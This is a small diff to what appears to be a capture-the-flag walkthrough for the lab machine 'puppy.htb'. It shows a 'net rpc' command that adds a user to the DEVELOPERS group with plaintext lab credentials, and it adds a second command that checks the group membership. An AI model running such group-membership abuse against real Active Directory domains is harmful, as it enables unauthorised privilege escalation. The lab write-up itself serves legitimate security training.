@@ -187,6 +187,6 @@ So our final command will look like this
 net rpc group addmem "DEVELOPERS" "levi.james" -U "puppy.htb"/"levi.james"%"KingofAkron2025!" -S 10.10.11.70
 ```
 Now lets verify if the user is added to the DEVS group
-```
-
+```bash
+net rpc group members "DEVELOPERS" -U "puppy.htb"/"levi.james"%"KingofAkron2025!" -S 10.10.11.70
 ```
